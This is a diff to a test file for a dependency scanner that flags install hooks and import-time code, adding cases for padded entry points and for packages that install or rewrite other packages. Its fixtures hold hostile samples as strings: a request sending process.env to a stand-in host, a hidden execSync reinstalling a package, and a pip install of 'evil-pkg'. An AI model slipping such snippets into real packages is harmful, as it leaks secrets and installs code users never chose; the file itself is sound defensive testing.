@@ -1,6 +1,9 @@
-// --deps: what a dependency runs (src/deps.js, twin of core.dependency_checks;
-// python/tests/scanner/test_review_dependency_checks.py has the same cases,
-// and tests/architecture/test_js_parity.py compares the two CLIs on them).
+// --deps: what a dependency runs (the engine's decisions since BR-7 step 3e:
+// deps.rs, whose unit tests hold the paths a hook's target joins to and the
+// entry points a package.json names; src/deps.js reads the tree for it, as
+// core does; python/tests/scanner/test_review_dependency_checks.py has the
+// same cases, and tests/architecture/test_js_parity.py compares the two CLIs
+// on them).
 // Each install hook of a dependency's manifest is followed to the files it
 // runs and escalates to CRITICAL when one fails the install-script test; a
 // dependency's other JavaScript and Python files get the import-time test
@@ -12,7 +15,7 @@ import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, symlinkSyn
 import { tmpdir } from "node:os";
 import { join, dirname } from "node:path";
 import { run } from "../src/index.js";
-import { treeJoin, npmEntries } from "../src/deps.js";
+import { planFiles } from "../src/deps.js";
 
 const EXFIL = "const h = require('https');\n" +
   "h.request({host: 'collector.invalid', method: 'POST'}).end(JSON.stringify(process.env));\n";
@@ -103,6 +106,8 @@ test("--deps: hooks escalate on what they run; import-time code; what cannot be 
       "node_modules/q/package.json": "Install hook runs ./pre.js, which pipes a download into a shell.",
       "node_modules/r/package.json": '"postinstall" script pipes a download into a shell.',
       "node_modules/t/package.json": "Install hook runs script, which pipes a download into a shell.",
+      // (0.1.9) the project's own hook too (projectHookChecks)
+      "package.json": `Install hook runs build.js, which ${ENV}.`,
     };
     for (const [manifest, msg] of Object.entries(critical)) assert.deepEqual(hooks[manifest], [["CRITICAL", msg]], manifest);
     assert.deepEqual(hooks["node_modules/k/package.json"], [["CRITICAL", `Install hook runs x.dat, which ${ENV}.`], ["CRITICAL", `Install hook runs x.dat, which ${ENV}.`]]);
@@ -112,7 +117,7 @@ test("--deps: hooks escalate on what they run; import-time code; what cannot be 
       ["CRITICAL", "Install hook runs gen.sh, which pipes a download into a shell."],
       ["MAJOR", `"install (implicit)" script runs code at install time: 'node-gyp rebuild'.`]]);
     for (const manifest of ["node_modules/g/package.json", "node_modules/h/package.json", "node_modules/j/package.json",
-      "node_modules/l/package.json", "node_modules/o/package.json", "node_modules/u/package.json", "package.json",
+      "node_modules/l/package.json", "node_modules/o/package.json", "node_modules/u/package.json",
       ...(linked ? ["node_modules/e/package.json"] : [])]) {
       assert.deepEqual(hooks[manifest].map(([sev]) => sev), ["MAJOR"], manifest);
     }
@@ -128,23 +133,13 @@ test("--deps: hooks escalate on what they run; import-time code; what cannot be 
     assert.ok(!redacted.snippet.join("\n").includes("ghp_") && !redacted.snippet.join("\n").includes("Zq8vN3pL0wX7rT2mK9sB4hF6"));
     assert.equal(rep.metrics.depFiles, 12);
 
-    const plain = scan(root, "--exclude", "excluded");                  // without --deps: nothing new
+    // without --deps: nothing of the dependencies; the project's own hook is followed (0.1.9, projectHookChecks)
+    const plain = scan(root, "--exclude", "excluded");
     assert.deepEqual(plain.issues.filter((i) => i.rule.startsWith("SC-")).map((i) => [i.rule, i.file, i.sev]),
-      [["SC-INSTALL-HOOK", "package.json", "MAJOR"]]);
+      [["SC-INSTALL-HOOK", "package.json", "CRITICAL"]]);
   } finally {
     rmSync(root, { recursive: true, force: true });
   }
-});
-
-test("treeJoin: inside the scan root only", () => {
-  const cases = [
-    [["node_modules/a", "x.js"], "node_modules/a/x.js"], [["node_modules/a", "./b/../x.js"], "node_modules/a/x.js"],
-    [["node_modules/a", "../../y.js"], "y.js"], [["node_modules/a", "../../../y.js"], null],
-    [["node_modules/a", "/usr/y.js"], null], [["node_modules/a", "C:/y.js"], null],
-    [["node_modules/a", "lib\\z.js"], "node_modules/a/lib/z.js"], [["", "x.js"], "x.js"], [["", ".."], null],
-    [["a", "."], "a"], [["a", ".."], null], [["a", "b//c/"], "a/b/c"],
-  ];
-  for (const [[base, target], want] of cases) assert.equal(treeJoin(base, target), want, `${base} + ${target}`);
 });
 
 // (the detection round) a web app's static assets run in a browser: left out unless an entry point
@@ -188,8 +183,80 @@ test("--deps: a web app's static assets no entry point reaches are not code that
   } finally {
     rmSync(root, { recursive: true, force: true });
   }
-  assert.deepEqual(npmEntries({ main: "a.js", module: "b.mjs", bin: { c: "c.js", d: 1 },
-    exports: { ".": { import: "./e.mjs", require: ["./f.js", "./g.js"] }, "./*": "./h/*.js" } }),
-  ["a.js", "b.mjs", "c.js", "./e.mjs", "./f.js", "./g.js"]);
-  assert.deepEqual(npmEntries({ bin: "x.js", exports: "./y.js" }), ["x.js", "./y.js"]);
+});
+
+test("--deps: padding hides no file from the walk (BR-5)", () => {
+  // the walk from a package's entry points stopped at 5,000 files, and its exports were read to 5,000 entry points,
+  // so a file in static/ reached past them was left out as a web asset (the Python test: the same)
+  const files = Array.from({ length: 5100 }, (_, i) => ({
+    path: `node_modules/w/lib/f${i}.js`, content: `require('./f${i + 1}.js');\n`, lang: "js", dep: true,
+  }));
+  files.push({ path: "node_modules/w/lib/f5100.js", content: "require('../static/run.js');\n", lang: "js", dep: true },
+    { path: "node_modules/w/static/run.js", content: WEB, lang: "js", dep: true });
+  const manifest = {
+    path: "node_modules/w/package.json", content: JSON.stringify({ name: "w", version: "1.0.0", main: "lib/f0.js" }),
+  };
+  const root = mkdtempSync(join(tmpdir(), "lz-deps-pad-"));
+  try {
+    assert.deepEqual(planFiles(root, files, new Set(), [manifest]).assets, []);
+    // an entry point past 6,000 exports
+    const exports = Object.fromEntries(Array.from({ length: 6000 }, (_, i) => [`./p${i}`, `./p${i}.js`]));
+    exports["./run"] = "./static/run.js";
+    const run = [{ path: "node_modules/v/static/run.js", content: WEB, lang: "js", dep: true }];
+    const v = { path: "node_modules/v/package.json", content: JSON.stringify({ name: "v", version: "1.0.0", exports }) };
+    assert.deepEqual(planFiles(root, run, new Set(), [v]).assets, []);
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test("--deps: each installed package's names for its tests (D-12b, D-9c)", () => {
+  // python: tests/scanner/test_deps_package_names.py
+  const chs = "const { execSync } = require('child_process');\n(function () {\n  try {\n" +
+    "    execSync('npm uninstall prettier-sdk && npm install prettier-sdk', { stdio: 'ignore', windowsHide: true });\n" +
+    "  } catch (e) { }\n})();\nmodule.exports = 1;\n";
+  const gen = (target) => "const fs = require('fs');\nconst path = require('path');\n" +
+    `const base = require.resolve('${target}/package.json').replace('/package.json', '');\n` +
+    "fs.writeFileSync(path.join(base, 'lib', 'gen.js'), 'module.exports = 1;\\n');\nmodule.exports = 1;\n";
+  const pip = "import subprocess, sys\nsubprocess.check_call([sys.executable, '-m', 'pip', 'install', 'evil-pkg'])\n";
+  const meta = (requires) => `Metadata-Version: 2.1\nName: evil\nVersion: 1.0\n${requires}\nA description.\n`;
+  const files = (fs) => {
+    const root = mkdtempSync(join(tmpdir(), "lz-names-"));
+    for (const [rel, data] of Object.entries(fs)) {
+      mkdirSync(dirname(join(root, ...rel.split("/"))), { recursive: true });
+      writeFileSync(join(root, ...rel.split("/")), data);
+    }
+    try {
+      return scan(root, "--deps").issues.filter((i) => i.rule === "SC-IMPORT-RISK" || i.rule === "SC-INSTALL-HOOK")
+        .map((i) => [i.rule, slash(i.file), i.sev, i.msg]);
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  };
+  const named = (deps) => JSON.stringify({ name: "hash-sdk", version: "1.0.0", ...deps });
+  // an install at import of what it does not declare; what it declares; no package.json
+  const [[rule, file, sev, msg]] = files({ "node_modules/hash-sdk/package.json": named({}), "node_modules/hash-sdk/index.js": chs });
+  assert.deepEqual([rule, file, sev], ["SC-IMPORT-RISK", "node_modules/hash-sdk/index.js", "CRITICAL"]);
+  assert.ok(msg.includes("installs packages the release does not depend on (prettier-sdk)"), msg);
+  assert.deepEqual(files({ "node_modules/hash-sdk/package.json": named({ dependencies: { "prettier-sdk": "^1" } }),
+    "node_modules/hash-sdk/index.js": chs }), []);
+  assert.deepEqual(files({ "node_modules/hash-sdk/index.js": chs }), []);
+  // its own folder is its own: at import and in its install script
+  const genPkg = (scripts) => JSON.stringify({ name: "gen-pkg", version: "1.0.0", scripts });
+  assert.deepEqual(files({ "node_modules/gen-pkg/package.json": genPkg({}), "node_modules/gen-pkg/index.js": gen("gen-pkg") }), []);
+  const other = files({ "node_modules/gen-pkg/package.json": genPkg({}), "node_modules/gen-pkg/index.js": gen("other-pkg") });
+  assert.deepEqual(other.map(([r, f, s]) => [r, f, s]), [["SC-IMPORT-RISK", "node_modules/gen-pkg/index.js", "CRITICAL"]]);
+  assert.ok(other[0][3].includes("rewrites another package's code (other-pkg)"), other[0][3]);
+  const hook = (target) => files({ "node_modules/gen-pkg/package.json": genPkg({ postinstall: "node gen.js" }),
+    "node_modules/gen-pkg/gen.js": gen(target) }).filter(([r]) => r === "SC-INSTALL-HOOK");
+  assert.ok(!hook("gen-pkg")[0][3].includes("rewrites another package's code"));
+  assert.ok(hook("other-pkg")[0][3].includes("rewrites another package's code (other-pkg)"));
+  // a Python distribution's: its METADATA's Name and Requires-Dist, by the RECORD that lists the module
+  const site = (requires) => ({ "site-packages/evil/__init__.py": pip,
+    "site-packages/evil-1.0.dist-info/METADATA": meta(requires),
+    "site-packages/evil-1.0.dist-info/RECORD": "evil/__init__.py,sha256=x,1\nevil-1.0.dist-info/METADATA,,\n" });
+  const [[, pyFile, pySev, pyMsg]] = files(site(""));
+  assert.deepEqual([pyFile, pySev], ["site-packages/evil/__init__.py", "CRITICAL"]);
+  assert.ok(pyMsg.includes("installs packages the release does not depend on (evil-pkg)"), pyMsg);
+  assert.deepEqual(files(site("Requires-Dist: evil-pkg>=1; extra == 'x'\n")), []);
 });
